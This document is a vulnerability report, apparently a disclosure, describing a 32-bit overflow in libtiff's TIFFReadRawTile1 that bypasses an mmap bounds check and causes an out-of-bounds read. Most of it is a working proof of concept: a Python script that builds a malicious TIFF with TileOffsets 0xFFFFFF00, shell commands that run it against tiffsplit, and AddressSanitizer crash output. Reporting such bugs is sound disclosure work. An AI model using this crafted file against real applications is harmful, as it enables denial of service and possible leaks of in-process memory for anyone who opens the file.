## Bug0: TIFFReadRawTile1 uint32 overflow bypasses mmap bounds check causing OOB read

In `TIFFReadRawTile1()` in `tif_read.c` (lines 440-451), the mmap branch computes `td_stripoffset[tile] + size` using 32-bit unsigned arithmetic with no overflow guard, so a crafted `TileOffsets` value of `0xFFFFFF00` combined with `TileByteCounts` of `256` wraps the sum to zero and causes the bounds check to pass, after which `_TIFFmemcpy` reads 256 bytes from approximately 4 GB past the mapped file base.

### PoC

Craft a malicious TIFF file using the Python script below and process it with the ASAN-instrumented tiffsplit binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

OUT = "poc_input.tif"

def pack_ifd_entry(tag, typ, count, value):
    return struct.pack("<HHII", tag, typ, count, value)

SHORT = 3
LONG  = 4

HEADER_SIZE  = 8
IFD_OFFSET   = 8
NUM_ENTRIES  = 13
IFD_SIZE     = 2 + NUM_ENTRIES * 12 + 4
XRES_OFFSET  = IFD_OFFSET + IFD_SIZE
YRES_OFFSET  = XRES_OFFSET + 8
TOTAL_SIZE   = YRES_OFFSET + 8

entries = []
entries.append(pack_ifd_entry(0x0100, LONG,  1, 16))
entries.append(pack_ifd_entry(0x0101, LONG,  1, 16))
entries.append(pack_ifd_entry(0x0102, SHORT, 1, 8))
entries.append(pack_ifd_entry(0x0103, SHORT, 1, 1))
entries.append(pack_ifd_entry(0x0106, SHORT, 1, 1))
entries.append(pack_ifd_entry(0x0115, SHORT, 1, 1))
entries.append(pack_ifd_entry(0x011A, 5,     1, XRES_OFFSET))
entries.append(pack_ifd_entry(0x011B, 5,     1, YRES_OFFSET))
entries.append(pack_ifd_entry(0x0128, SHORT, 1, 2))
entries.append(pack_ifd_entry(0x0142, LONG,  1, 16))
entries.append(pack_ifd_entry(0x0143, LONG,  1, 16))
entries.append(pack_ifd_entry(0x0144, LONG,  1, 0xFFFFFF00))
entries.append(pack_ifd_entry(0x0145, LONG,  1, 256))

header  = b'\x49\x49'
header += struct.pack("<H", 42)
header += struct.pack("<I", IFD_OFFSET)

ifd  = struct.pack("<H", NUM_ENTRIES)
ifd += b''.join(entries)
ifd += struct.pack("<I", 0)

xres = struct.pack("<II", 72, 1)
yres = struct.pack("<II", 72, 1)

data = header + ifd + xres + yres

with open(OUT, "wb") as f:
    f.write(data)

print(f"[+] Written {len(data)} bytes to {OUT}")
print(f"    TileOffsets[0]    = 0xFFFFFF00")
print(f"    TileByteCounts[0] = 256")
print(f"    uint32 sum        = {(0xFFFFFF00 + 256) & 0xFFFFFFFF} (overflows to 0)")
print(f"    tif_size          = {len(data)} bytes")
print(f"    Bounds check:  0 > {len(data)}  -> False  -> proceeds to OOB read")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/bin/tiffsplit poc_input.tif /tmp/out_ || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** AddressSanitizer:DEADLYSIGNAL
ERROR: AddressSanitizer: SEGV on unknown address 0x7f6b85975f00 (pc 0x7f6a88e94881 bp 0x7fff7aaa9380 sp 0x7fff7aaa9348 T0)
SUMMARY: AddressSanitizer: SEGV (/lib/x86_64-linux-gnu/libc.so.6+0xc4881) in memcpy

### Impact

An attacker who supplies a crafted TIFF file can cause `tiffsplit` (and any application using `TIFFReadRawTile`) to perform an out-of-bounds read of up to the specified tile byte count from memory far outside the mapped file region, resulting in a reliable crash (denial of service). On platforms where adjacent virtual memory is mapped or in 32-bit address spaces the same primitive can expose sensitive in-process data or be leveraged for further exploitation, and the attack requires only that a victim open the malicious file with no elevated privileges needed.
